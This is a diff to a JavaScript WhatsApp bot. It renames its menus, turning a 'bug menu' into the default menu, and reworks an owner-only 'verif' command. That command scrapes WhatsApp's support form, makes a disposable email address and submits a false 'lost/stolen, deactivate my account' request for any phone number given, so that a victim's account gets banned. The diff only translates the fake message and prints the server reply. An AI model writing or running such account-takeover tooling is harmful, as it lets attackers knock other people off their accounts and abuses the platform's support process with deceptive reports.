@@ -1,4 +1,4 @@
-﻿const { modul } = require('./module');
+const { modul } = require('./module');
 const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
 const { exec, spawn, execSync } = child_process
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
@@ -237,7 +237,7 @@ messageId: ""
 })
 }
 switch (command) {
-case 'menu':
+case 'adminmenu':
 textot = `𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉
 ∥ ۞ Nama BOT: Billa BOT
 ∥ ۞ Platform: Panel 
@@ -262,9 +262,9 @@ textot = `𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉
 `
 crazy.sendMessage(from,{ image: {url : "https://telegra.ph/file/f957073ff44a06b65855d.jpg"},caption: textot },{ quoted: crazy.chat })
 break
-case 'bugmenu':
+case 'menu':
 textot = `𝘽𝙐𝙂𝙈𝙀𝙉𝙐
-∥ ۞ VERSION : Beta
+∥ ۞ VERSION : 666
 ∥ ۞ Platform: Panel 
 ∥ ۞ Library: Baileys MD
 
@@ -335,43 +335,42 @@ case 'ban':
  case 'verif': {
     if (!itsMecrazy) return m.reply(`sorry anda sepertinya bukan pemilik bot`)
  // if (!isGroupAdmins) return m.reply(`sorry wilayah admin`)
-    var axioss = require ("axios")
-    let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-  let cookie = ntah.headers["set-cookie"].join("; ")
-  let $ = cheerio.load(ntah.data)
-  let $form = $("form");
-  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-  let form = new URLSearchParams()
-  form.append("jazoest", $form.find("input[name=jazoest]").val())
-  form.append("lsd", $form.find("input[name=lsd]").val())
-  form.append("step", "submit")
-  form.append("country_selector", "ID")
-  form.append("phone_number", q)
-  form.append("email", email.data[0])
-  form.append("email_confirm", email.data[0])
-  form.append("platform", "ANDROID")
-  form.append("your_message", "Perdido/roubado: desative minha conta")
-  form.append("__user", "0")
-  form.append("__a", "1")
-  form.append("__csr", "")
-  form.append("__req", "8")
-  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-  form.append("dpr", "1")
-  form.append("__ccg", "UNKNOWN")
-  form.append("__rev", "1006630858")
-  form.append("__comment_req", "0")
-  let res = await axioss({
-    url,
-    method: "POST",
-    data: form,
-    headers: {
-      cookie
-    }
-  })
-  m.reply(`DONE ${command} By Crazy Bot
-Jika Nomer Masih Aktif No Tersebut Sudah Terkena ${command} Sebelumnya`)
-  }
+   var axioss = require ("axios")
+   let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+ let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+ let cookie = ntah.headers["set-cookie"].join("; ")
+ let $ = cheerio.load(ntah.data)
+ let $form = $("form");
+ let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+ let form = new URLSearchParams()
+ form.append("jazoest", $form.find("input[name=jazoest]").val())
+ form.append("lsd", $form.find("input[name=lsd]").val())
+ form.append("step", "submit")
+ form.append("country_selector", "ID")
+ form.append("phone_number", q)
+ form.append("email", email.data[0])
+ form.append("email_confirm", email.data[0])
+ form.append("platform", "ANDROID")
+ form.append("your_message", "Hilang/Dicuri: Nonaktifkan akun saya")
+ form.append("__user", "0")
+ form.append("__a", "1")
+ form.append("__csr", "")
+ form.append("__req", "8")
+ form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+ form.append("dpr", "1")
+ form.append("__ccg", "UNKNOWN")
+ form.append("__rev", "1006630858")
+ form.append("__comment_req", "0")
+ let res = await axioss({
+   url,
+   method: "POST",
+   data: form,
+   headers: {
+     cookie
+   }
+ })
+ m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
+ }
  break
     case 'stats' : {
         m.reply(`💻 Info Server
